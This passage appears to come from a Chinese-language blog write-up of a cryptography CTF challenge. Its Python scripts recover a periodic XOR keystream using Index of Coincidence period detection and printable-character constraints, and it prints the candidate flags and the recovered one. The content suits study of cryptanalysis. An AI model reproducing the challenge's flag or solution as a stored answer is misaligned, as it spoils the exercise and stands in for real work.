print(f&quot;[*] 正在应用“约束 2”(Printable msg parts)...&quot;)    def filter_set_with_byte(guesses_set, ct_byte, constraints_set):        &quot;&quot;&quot;辅助函数：用一个密文字节过滤一个猜测集&quot;&quot;&quot;        # 如果猜测集已经只有一个值，就跳过        if len(guesses_set) &lt;= 1:            return        current_guesses = guesses_set.copy()        for k_guess in current_guesses:            # 随机数据不包含 0x00，所以使用 PRINTABLE_ONLY            if (ct_byte ^ k_guess) not in PRINTABLE_ONLY:                guesses_set.remove(k_guess)    # 遍历所有需要的密钥位置    for pos in tqdm(key_candidates.keys(), desc=&quot;Filtering keys&quot;):        if len(key_candidates[pos]) == 1:            continue        # 遍历 msg_part1 (后 60%)        start_idx = slice1_reliable_range[0]        end_idx = slice1_reliable_range[1]        # (高效遍历, 从 &#x27;pos&#x27; 在范围内的第一个索引开始)        first_i = start_idx + (pos - start_idx) % PERIOD        for i in range(first_i, end_idx, PERIOD):            filter_set_with_byte(key_candidates[pos], ct[i], PRINTABLE_ONLY)        # 遍历 msg_part2        start_idx = slice2_range[0]        end_idx = slice2_range[1]        first_i = start_idx + (pos - start_idx) % PERIOD        for i in range(first_i, end_idx, PERIOD):            filter_set_with_byte(key_candidates[pos], ct[i], PRINTABLE_ONLY)    # --- 5. 检查结果并进行暴力破解 ---    print(&quot;\\n[*] 约束应用完成。正在检查剩余可能性...&quot;)    total_solutions = 1    has_contradiction = False    unresolved_keys = &#123;&#125;  # 存储多解的密钥    for pos in unique_key_positions:        count = len(key_candidates[pos])        if count == 0:            print(f&quot;[!] 致命错误: 密钥位置 &#123;pos&#125; 没有可能的解！(出现矛盾)&quot;)            has_contradiction = True        elif count &gt; 1:            print(f&quot;[!] 警告: 密钥位置 &#123;pos&#125; 仍有 &#123;count&#125; 个解&quot;)            unresolved_keys[pos] = count        # 使用 math.prod 来避免浮点数问题        total_solutions = prod([len(key_candidates[pos]) for pos in unique_key_positions])    if has_contradiction:        print(&quot;[!] 无法解密。请检查周期或已知明文/暂态假设。&quot;)        sys.exit(1)    print(f&quot;[*] 总可能性空间: &#123;total_solutions&#125; 个解。&quot;)    if total_solutions &gt; 500000:  # 设置一个安全阈值        print(&quot;[!] 解空间太大，无法全部打印。&quot;)        print(f&quot;   未唯一确定的密钥: &#123;unresolved_keys&#125;&quot;)        print(&quot;   请考虑增加更多约束&quot;)        sys.exit(1)    print(&quot;\\n==================== 可能的 FLAG ====================&quot;)    # 递归函数来探索所有可能的解    solution_count = 0    def solve(flag_body_idx, current_flag_bytes):        nonlocal solution_count        # 如果解完了，打印        if flag_body_idx == len(flag_body_ct):            try:                # 打印完整的 flag                print(&quot;flag&#123;&quot; + current_flag_bytes.decode(&#x27;ascii&#x27;))                solution_count += 1            except UnicodeDecodeError:                pass  # 忽略无效的 (非 ascii) flag            return        pos = flag_body_key_positions[flag_body_idx]        c_byte = flag_body_ct[flag_body_idx]        # 遍历这个位置的所有可能性        for k_guess in key_candidates[pos]:            pt_byte = c_byte ^ k_guess            # 应用约束 3 (Printable Flag)            if pt_byte in PRINTABLE_BYTES:                solve(flag_body_idx + 1, current_flag_bytes + bytes([pt_byte]))    # 开始递归    solve(0, b&#x27;&#x27;)    print(&quot;=====================================================&quot;)    print(f&quot;[*] 搜索完成。共找到 &#123;solution_count&#125; 种符合 &#x27;printable-flag&#x27; 约束的解。&quot;)    if solution_count == 0 and total_solutions &gt; 0:        print(&quot;[!] 未找到符合 &#x27;printable&#x27; 约束的解。也许 flag 包含非打印字符？&quot;)if __name__ == &quot;__main__&quot;:    main()\n用这些限制筛选掉尽可能多的可能性后，最后仍然有12种可能性不能排除，肉眼看一看找到最像flag的就好了\n[*] 正在加载密文文件: ciphertext[*] 密文加载成功，总长度: 1048619 字节[*] 周期 $p=4096$。推断: len(flag) = 37 字节[*] &#x27;约束 2&#x27; 将使用两个数据范围:    - 暂态后 (slice1) 范围: (172068, 524288)    - 稳定 (slice2) 范围: (524327, 1048615)[*] Flag 主体 (32 字节) 依赖于 32 个唯一的密钥字节。[*] 正在应用“约束 1”(已知明文)...[*] 正在应用“约束 2”(Printable msg parts)...Filtering keys: 100%|██████████| 32/32 [00:00&lt;00:00, 13249.53it/s][*] 约束应用完成。正在检查剩余可能性...[!] 警告: 密钥位置 6 仍有 2 个解[!] 警告: 密钥位置 7 仍有 2 个解[!] 警告: 密钥位置 8 仍有 3 个解[*] 总可能性空间: 12 个解。==================== 可能的 FLAG ====================flag&#123;Cngot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Cnaot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Cn`ot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Chgot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Chaot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Ch`ot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Engot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Enaot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;En`ot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Ehgot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Ehaot1c_Sequ3nces_4lso_conv3rg3&#125;flag&#123;Eh`ot1c_Sequ3nces_4lso_conv3rg3&#125;=====================================================[*] 搜索完成。共找到 12 种符合 &#x27;printable-flag&#x27; 约束的解。\n最正确的只能是flag&#123;Chaot1c_Sequ3nces_4lso_conv3rg3&#125;这个。\n补充即使完全抛弃flag前面的部分，只从flag开始也能够排除大部分了，剩下大约200多种，再借助一下精湛的英语语感（例如谷歌翻译在拼错单词时会猜测正确的词）就能找到。和另外两道题的flag都是随机的十六进制数相比，这一题倒是很有意思。\n以及在做这题的时候虽然想到了周期性，但是一开始没跑那1000个种子的试验，因为那份代码跑一次硬控我六分钟。刚开始我用Gemini提供的IC(Index of Coincidence)测试。\nimport collectionsimport mathimport sysimport numpy as np# --- 常量 ---CT_FILE = &#x27;ciphertext&#x27; # 你的密文文件名MAX_PERIOD_GUESS_IC = 50  # IC 测试要检查的最大周期PRINTABLE_IC_THEORY = 1.0 / len(string.printable) # 约 0.01# --- 辅助函数 ---def calculate_ic(data):    &quot;&quot;&quot;    计算一段字节数据的重合指数 (IC)    &quot;&quot;&quot;    if not data or len(data) &lt; 2:        return 0.0    N = len(data)    counts = np.bincount(np.frombuffer(data, dtype=np.uint8), minlength=256)    numerator = np.sum(counts * (counts - 1))    denominator = N * (N - 1)    if denominator == 0:        return 0.0    return numerator / denominator# --- 主要分析函数 ---def find_period_ic(ct, known_printable_ic):    &quot;&quot;&quot;    使用重合指数 (IC) 猜测周期    &quot;&quot;&quot;    print(f&quot;\\n--- 重合指数 (IC) 分析 (测试周期 1 到 &#123;MAX_PERIOD_GUESS_IC&#125;) ---&quot;)        random_ic = 1.0 / 256.0  # 约 0.0039        print(f&quot;[*] 理论 IC (随机数据):   &#123;random_ic:.5f&#125;&quot;)    print(f&quot;[*] 理论 IC (Printable 明文): &#123;known_printable_ic:.5f&#125; (我们的目标)&quot;)        overall_ic = calculate_ic(ct)    print(f&quot;[*] “干净”密文的整体 IC: &#123;overall_ic:.5f&#125; (应接近 0.0039)&quot;)        if abs(overall_ic - random_ic) &gt; 0.001:        print(&quot;[!] 警告: 整体 IC 不接近随机值。&quot;)    print(&quot;\\n[+] 开始逐个测试周期：&quot;)    print(&quot;---------------------------------------&quot;)    print(&quot; 周期 (长度) | 平均 IC 值&quot;)    print(&quot;---------------------------------------&quot;)    results = []        for period in range(1, MAX_PERIOD_GUESS_IC + 1):        columns = [bytearray() for _ in range(period)]        for i, byte in enumerate(ct):            columns[i % period].append(byte)                total_ic = 0.0        for col_data in columns:            total_ic += calculate_ic(col_data)                    avg_ic = total_ic / period        results.append((period, avg_ic))                # 寻找与明文理论 IC 值最接近的        marker = &quot;&quot;        if avg_ic &gt; (known_printable_ic * 0.9): # 如果 IC 达到了理论值的 90%             marker = f&quot; &lt;&lt;-- 高可能性 (接近 &#123;known_printable_ic:.4f&#125;)&quot;                print(f&quot; &#123;period:&lt;11&#125; | &#123;avg_ic:.5f&#125;&#123;marker&#125;&quot;)    print(&quot;---------------------------------------&quot;)        if results:        best_period, best_ic = max(results, key=lambda item: item[1])        print(f&quot;\\n[*] IC 分析推测的最可能周期: &#123;best_period&#125; (IC = &#123;best_ic:.5f&#125;)&quot;)    else:        print(&quot;\\n[*] IC 分析未找到明显的周期。&quot;)# --- 主程序 ---def main():    print(f&quot;[*] 正在加载密文文件: &#123;CT_FILE&#125;&quot;)    try:        with open(CT_FILE, &#x27;rb&#x27;) as f:            ct = f.read()        L_ct = len(ct)        print(f&quot;[*] 密文加载成功，总长度: &#123;L_ct&#125; 字节&quot;)    except FileNotFoundError:        print(f&quot;[!] 错误: 密文文件 &#x27;&#123;CT_FILE&#125;&#x27; 未找到。&quot;)        sys.exit(1)            # --- 1. 计算“干净”数据范围 ---    L_RANDOM_MSG_TOTAL = 1048576    L_RANDOM_PART1 = L_RANDOM_MSG_TOTAL // 2    L_KNOWN_PLAINTEXT_BYTES = 6 # (b&#x27;\\x00&#x27; + b&#x27;\\x00&#x27; + b&#x27;\\x00\\x00\\x00\\x00&#x27;)        L_flag = L_ct - L_RANDOM_MSG_TOTAL - L_KNOWN_PLAINTEXT_BYTES        if L_flag &lt; 0:        print(f&quot;[!] 错误: 密文长度 &#123;L_ct&#125; 太短，与预期的明文结构不符。&quot;)        print(f&quot;[!] 预期至少需要 &#123;L_RANDOM_MSG_TOTAL + L_KNOWN_PLAINTEXT_BYTES&#125; 字节。&quot;)        sys.exit(1)            print(f&quot;[*] 根据密文长度推断: len(flag) = &#123;L_flag&#125; 字节&quot;)        L_CONTAMINANT_MID = L_flag + 2 # (b&#x27;\\x00&#x27; + flag + b&#x27;\\x00&#x27;)        # --- 2. 提取“干净”数据 ---    slice1_start = 0    slice1_end = L_RANDOM_PART1        slice2_start = slice1_end + L_CONTAMINANT_MID    slice2_end = L_ct - 4 # 排除末尾的 4 个 null        ct_clean_1 = ct[slice1_start : slice1_end]    ct_clean_2 = ct[slice2_start : slice2_end]        ct_to_test = ct_clean_1 + ct_clean_2        L_clean = len(ct_to_test)        print(f&quot;[*] 提取的“干净”密文块 1: 字节 0 到 &#123;slice1_end&#125;&quot;)    print(f&quot;[*] 提取的“干净”密文块 2: 字节 &#123;slice2_start&#125; 到 &#123;slice2_end&#125;&quot;)    print(f&quot;[*] 用于 IC 分析的总数据量: &#123;L_clean&#125; 字节 (应为 &#123;L_RANDOM_MSG_TOTAL&#125;)&quot;)    if L_clean != L_RANDOM_MSG_TOTAL:        print(f&quot;[!] 警告: 提取的“干净”数据长度 (&#123;L_clean&#125;) 与预期的 &#123;L_RANDOM_MSG_TOTAL&#125; 不符！&quot;)            # --- 3. 执行 IC 分析 ---    # 计算 printable 集合的理论 IC 值    import string    printable_bytes = set(string.printable.encode(&#x27;ascii&#x27;))    # 假设 &#x27;printable&#x27; 中的 100 个字符是均匀分布的    # 实际分布可能不均，但 1/100 是一个很好的近似值    printable_ic_estimate = 1.0 / len(printable_bytes)         find_period_ic(ct_to_test, printable_ic_estimate)        print(&quot;\\n--- 分析完成 ---&quot;)    print(&quot;请查看 IC 分析中 IC 值&#x27;异常高&#x27;（接近 ~0.01）的周期。&quot;)    print(&quot;这个数字就是密钥的周期长度。&quot;)if __name__ == &quot;__main__&quot;:    main()\n如果周期不对，那么每个密文对应的密钥不同，密文分布应该在0x00到0xFF均等，也就是重合指数应该在$\\frac{1}{256}\\approx0.00391$，周期对的话密文来自可打印字符异或同一个数，由于可打印字符的范围较小，只有100种，因此密文范围也较小，重合指数约为$\\frac{1}{100}=0.01$，将远远大于周期不对的情况。我偶然发现2的幂次对应的重合指数都格外高，于是严重怀疑周期是2的若干次方。\n然后用2的幂测IC，发现2048和4096都几乎达到1，2048还高一些。我问Gemini为什么达不到1，它跟我说在进入周期之前会有一段暂态，这部分不应加入计算。于是它去掉了前75%，终于看到接近0.01了——但是更大的周期IC更高，131072甚至超过了0.01，我没敢信。于是我去想别的验证周期的方案，就花了好几个六分钟，跑不同的种子。不过还得感谢这段经历，要不然我到死都想不到为什么周期明明是4096，但是按照4096切片却找不到key使得每一位都是可打印字符。结论是最开始那一段就该扔掉。\n以及这个混沌理论都是2008年的东西了，华为杯有点老啊。\n后记最近比赛有点多，强网杯做出0道，强网拟态抄网上的模板做了一道，着实有些道心破碎了，感觉自己有点没入门密码学hhh，但是即使自己就这水平，也已经算是队伍里半个主力了，怎么会这样呢（）多学吧，幻夜子雨菜菜的。\n","tags":["Writeup","2025","华为杯"]}]